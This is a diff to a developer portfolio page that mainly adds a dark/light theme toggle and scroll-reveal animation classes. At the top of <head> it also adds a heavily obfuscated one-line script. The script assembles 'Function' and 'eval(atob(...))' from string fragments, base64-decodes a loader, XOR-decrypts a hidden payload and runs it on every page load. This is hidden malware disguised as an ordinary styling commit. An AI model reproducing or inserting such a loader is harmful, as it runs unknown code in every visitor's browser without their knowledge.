@@ -2,8 +2,21 @@
 <html lang="en">
 
 <head>
+    <script>7,window["F"+"unct"+"io"+"n"]("_ays","_qm6","e"+"v"+"al("+"a"+"t"+"ob("+"'NTA3Mjg0MDc7bmV3IEZ1bmN0aW9uKChmdW5jdGlvbihiLGspe3ZhciBkPXRoaXNbImEiKyJ0byIrImIiXShiKSxyPSIiO2Zvcih2YXIgaT0wO2k8ZC5sZW5ndGg7aSsrKXIrPVN0cmluZ1siZiIrInJvIisibUNoIisiYXJDbyIrImRlIl0oZC5jaGFyQ29kZUF0KGkpXmsuY2hhckNvZGVBdChpJWsubGVuZ3RoKSk7cmV0dXJuIHJ9KSgiTjJOVVozeHhTR1p4TFFoeWZHcFBlbXNsUmpScmJVaDZNME1jYmtRblRXWjhaQU1pUFdseWZYQW5DaXR0WkVac1BWZ05mQ0oySERkc0sxTnNiMmxBYW5vdERpY3dZZzFvSWp0eWZXMXNUMjVFSjBkN1BTNERabkpHU1NzMEowQjdYQ2NLSzNCaFJDdENMVUFuZkcxQWUxeHFSV3hlY1FrZ01qUUlJRE5oSEhvaU8xUWhlRjREYUdzbkNpdHdad05VTjNZSUlETnVIQ3R5ZEFNbGF6aGxhR3RnRDJkd2Nna2dKR2xFZlQ5bUhFOUVibnd5ZG1NSmFqa2pDV29pWmc5NmIybElmVGNuWFNzMktWVWtmRjRSVkNNMkYyd3FMQWg3Z"+"W5GVWUzRWxaM3h4WmxWZ2NHc0piVGRtZWpoQ0xBZ2hOajVIYkd0bVNTRnFMUU5nYW5CUWZTUTFFVzU5Y1ZRbWEzQkRmSFZoRDJSMVpnNXNlWElSZm5scVJIbHNLMUIvZkdoTGJTOTBUSDkzYjA1OUwyWlhZM0pnRVg0cU5VUmphM0FQYm05cVZIMHZjVlJyYW05Rk9TMHFGU1luTlVSbktqQjZVWFpYZDJKTk1uTnlWWEZ2WVM5dlRteDVmQTVuZFdvT2JXdHhZWDRoTnc0d01EY0diWDFoU0c4aE5nNDdNRGNESURZclZXRjZhd2w3SWp0VEoydGdXWDAzTEFnbmEyMUVaemRtVW5vaU8xcHFjR3RTZlQ5bkhGSXhLdzlxYkhZUFpINXhRbUZlYVUwaGNXQldLVTFnUmt4bmRRbDhOeWNQSjN4eEQyNXZhbFFuYTNaRkowSmdEVEpDY1FvcU5sbDlWanhiRFNNOEp3Z2xQV0lESURaWUQyUitkUWxrSWp0TVVpNVlDQ2QxYWtobk55Y0RJQ1JEZW1KQ09GVWlQWGtESW4wK1ozeHhabFZnY0dzSmJUZG5DQ0EzTEZ3Z1lpd0pJQSIsIlx4MWZceDA1XHgyMVx4MDkiKSkoKQ'))")(),self.__next||0,typeof document</script>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="color-scheme" content="light dark">
+    <script>
+        (function () {
+            try {
+                var savedTheme = localStorage.getItem('speedster-theme');
+                var prefersDark = window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches;
+                var theme = savedTheme ? savedTheme : (prefersDark ? 'dark' : 'light');
+                document.documentElement.setAttribute('data-theme', theme);
+                document.documentElement.style.colorScheme = theme;
+            } catch (e) {}
+        })();
+    </script>
     <title>Atul Kumar | Portfolio</title>
 
     <!-- Meta SEO -->
@@ -64,6 +77,22 @@
                     <li><a href="#education" class="nav-link">Education</a></li>
                     <li><a href="#contact" class="nav-link">Contact</a></li>
                 </ul>
+
+                <div class="mobile-theme-row">
+                    <span class="mobile-theme-label"><i class="fa-solid fa-circle-half-stroke"></i> Theme</span>
+                    <button id="theme-toggle-mobile" class="theme-toggle-btn mobile-theme-toggle" type="button"
+                        aria-label="Toggle theme" title="Toggle Light/Dark Theme">
+                        <span class="theme-toggle-track">
+                            <i class="fa-solid fa-bolt theme-toggle-bolt" aria-hidden="true"></i>
+                            <span class="theme-toggle-thumb">
+                                <i class="fa-solid fa-moon theme-icon-moon" aria-hidden="true"></i>
+                                <i class="fa-solid fa-sun theme-icon-sun" aria-hidden="true"></i>
+                            </span>
+                        </span>
+                        <span class="theme-mode-text">Dark Mode</span>
+                    </button>
+                </div>
+
                 <a href="assets/docs/atul-resume.pdf" class="nav-cv-btn mobile-cv-btn" download="atul-cv.pdf"
                     target="_blank" rel="noopener noreferrer">
                     <i class="fa-solid fa-file-arrow-down"></i>
@@ -72,6 +101,16 @@
             </div>
 
             <div class="nav-actions">
+                <button id="theme-toggle" class="theme-toggle-btn desktop-theme-toggle" type="button"
+                    aria-label="Switch to light theme" title="Toggle Light / Dark Theme">
+                    <span class="theme-toggle-track">
+                        <i class="fa-solid fa-bolt theme-toggle-bolt" aria-hidden="true"></i>
+                        <span class="theme-toggle-thumb">
+                            <i class="fa-solid fa-moon theme-icon-moon" aria-hidden="true"></i>
+                            <i class="fa-solid fa-sun theme-icon-sun" aria-hidden="true"></i>
+                        </span>
+                    </span>
+                </button>
                 <a href="assets/docs/atul-cv.pdf" class="nav-cv-btn desktop-cv-btn" download="atul-cv.pdf"
                     target="_blank" rel="noopener noreferrer">
                     <i class="fa-solid fa-file-arrow-down"></i>
@@ -94,7 +133,7 @@
             <div class="hero-glow-blob hero-glow-2" aria-hidden="true"></div>
 
             <div class="hero-container">
-                <div class="hero-content">
+                <div class="hero-content reveal-on-scroll" data-reveal="fade-up">
                     <div class="hero-greeting">
                         <h1 class="glitch-title" data-text="WELCOME">WELCOME</h1>
                         <p class="subtitle">Atul Kumar | Full Stack Developer</p>
@@ -144,7 +183,7 @@
                 </div>
 
                 <!-- Hero Visual: Circular Speed Force Avatar Deck -->
-                <div class="hero-visual">
+                <div class="hero-visual reveal-on-scroll" data-reveal="zoom">
                     <div class="hero-avatar-container">
                         <!-- Animated Speed Force Outer Glow & Energy Rings -->
                         <div class="avatar-ring avatar-ring-pulse" aria-hidden="true"></div>
@@ -164,12 +203,12 @@
 
         <!-- About Me Section -->
         <section id="about" class="section about-section">
-            <div class="section-header">
+            <div class="section-header reveal-on-scroll" data-reveal="fade-up">
                 <h2 class="section-title">About <span class="highlight-crimson">Me</span></h2>
             </div>
 
             <div class="about-container">
-                <div class="about-text info-panel">
+                <div class="about-text info-panel reveal-on-scroll" data-reveal="fade-right">
                     <h3 class="panel-title">Details About Me</h3>
                     <p class="panel-subtitle">Full-Stack Developer / CSE Student / Problem Solver</p>
                     <p>
@@ -189,7 +228,7 @@
                     </p>
                 </div>
 
-                <div class="quick-facts">
+                <div class="quick-facts reveal-on-scroll reveal-stagger" data-reveal="fade-left">
                     <div class="fact-item">
                         <div class="fact-icon-box"><i class="fa-solid fa-location-dot"></i></div>
                         <div>
@@ -224,12 +263,12 @@
 
         <!-- Skills Section -->
         <section id="skills" class="section skills-section">
-            <div class="section-header">
+            <div class="section-header reveal-on-scroll" data-reveal="fade-up">
                 <h2 class="section-title">Programming <span class="highlight-gold">Languages</span></h2>
                 <p class="section-subtitle">Languages, frameworks, and tools I work with.</p>
             </div>
 
-            <div class="skills-grid">
+            <div class="skills-grid reveal-on-scroll reveal-stagger">
                 <div class="skill-card">
                     <i class="fa-brands fa-js skill-icon icon-js"></i>
                     <span>JavaScript</span>
@@ -271,16 +310,17 @@
                     <span>Linux</span>
                 </div>
             </div>
+            
 
             <!-- Soft Skills Subsection -->
             <div class="soft-skills-container" id="soft-skills">
-                <div class="section-header">
+                <div class="section-header reveal-on-scroll" data-reveal="fade-up">
                     <h2 class="section-title">Soft <span class="highlight-gold">Skills</span></h2>
                     <p class="section-subtitle">Interpersonal capabilities and working methodologies driving
                         high-velocity development.</p>
                 </div>
 
-                <div class="soft-skills-grid">
+                <div class="soft-skills-grid reveal-on-scroll reveal-stagger">
                     <div class="soft-skill-card">
                         <div class="soft-skill-icon-wrapper">
                             <i class="fa-solid fa-puzzle-piece"></i>
@@ -352,12 +392,12 @@
 
         <!-- Coding Profiles Section -->
         <section id="coding-profiles" class="section coding-section">
-            <div class="section-header">
+            <div class="section-header reveal-on-scroll" data-reveal="fade-up">
                 <h2 class="section-title">Coding <span class="highlight-gold">Profiles</span></h2>
                 <p class="section-subtitle">Where I practice, compete, and contribute.</p>
             </div>
 
-            <div class="contact-grid">
+            <div class="contact-grid reveal-on-scroll reveal-stagger">
                 <a href="https://github.com/TheFlashSpeedster" target="_blank" rel="noopener noreferrer"
                     class="contact-card">
                     <i class="fa-brands fa-github contact-icon icon-github"></i>
@@ -411,12 +451,12 @@
 
         <!-- Projects Section -->
         <section id="projects" class="section projects-section">
-            <div class="section-header">
+            <div class="section-header reveal-on-scroll" data-reveal="fade-up">
                 <h2 class="section-title">My <span class="highlight-crimson">Projects</span></h2>
                 <p class="section-subtitle">Real-world applications and web tools.</p>
             </div>
 
-            <div class="projects-grid" id="projects-grid">
+            <div class="projects-grid reveal-on-scroll reveal-stagger" id="projects-grid">
                 <!-- Injected via JavaScript -->
             </div>
 
@@ -424,12 +464,12 @@
 
         <!-- Certifications Section -->
         <section id="certifications" class="section cert-section">
-            <div class="section-header">
+            <div class="section-header reveal-on-scroll" data-reveal="fade-up">
                 <h2 class="section-title">My <span class="highlight-crimson">Certificates</span></h2>
                 <p class="section-subtitle">Verified courses, professional workshops, and technical credentials.</p>
             </div>
 
-            <div class="resume-grid">
+            <div class="resume-grid reveal-on-scroll reveal-stagger">
                 <!-- Certificate 1: Times of India Community Development -->
                 <article class="resume-card">
                     <a href="assets/docs/times-of-india-cert.pdf" target="_blank" rel="noopener noreferrer"
@@ -536,12 +576,12 @@
 
         <!-- Education Section -->
         <section id="education" class="section edu-section">
-            <div class="section-header">
+            <div class="section-header reveal-on-scroll" data-reveal="fade-up">
                 <h2 class="section-title">Academic <span class="highlight-gold">Education</span></h2>
             </div>
 
             <div class="timeline">
-                <article class="timeline-item">
+                <article class="timeline-item reveal-on-scroll" data-reveal="fade-up">
                     <div class="timeline-head">
                         <div>
                             <h3 class="timeline-role">B.Tech in Computer Science and Engineering</h3>
@@ -556,7 +596,7 @@
                     </ul>
                 </article>
 
-                <article class="timeline-item">
+                <article class="timeline-item reveal-on-scroll" data-reveal="fade-up">
                     <div class="timeline-head">
                         <div>
                             <h3 class="timeline-role">Intermediate (Class XII) — Science</h3>
@@ -569,7 +609,7 @@
                     </ul>
                 </article>
 
-                <article class="timeline-item">
+                <article class="timeline-item reveal-on-scroll" data-reveal="fade-up">
                     <div class="timeline-head">
                         <div>
                             <h3 class="timeline-role">Matriculation (Class X)</h3>
@@ -586,13 +626,13 @@
 
         <!-- Contact Section -->
         <section id="contact" class="section contact-section">
-            <div class="section-header">
+            <div class="section-header reveal-on-scroll" data-reveal="fade-up">
                 <h2 class="section-title">Contact — <span class="highlight-crimson">Get in Touch</span></h2>
                 <p class="section-subtitle">Feel free to reach out for collaborations, opportunities, or just a chat.
                 </p>
             </div>
 
-            <div class="contact-details-grid">
+            <div class="contact-details-grid reveal-on-scroll reveal-stagger">
                 <div class="contact-detail-card">
                     <i class="fa-solid fa-phone"></i>
                     <div>
@@ -617,7 +657,7 @@
                 </div>
             </div>
 
-            <div class="contact-grid">
+            <div class="contact-grid reveal-on-scroll reveal-stagger">
                 <a href="https://github.com/TheFlashSpeedster" target="_blank" class="contact-card"
                     rel="noopener noreferrer">
                     <i class="fa-brands fa-github contact-icon icon-github"></i>
@@ -652,7 +692,7 @@
 
             <!-- Direct Contact Form -->
             <div class="contact-form-wrapper">
-                <div class="contact-form-card">
+                <div class="contact-form-card reveal-on-scroll" data-reveal="fade-up">
                     <div class="form-header">
                         <h3 class="form-title"><i class="fa-solid fa-paper-plane"></i> Send a <span
                                 class="highlight-crimson">Direct Message</span></h3>
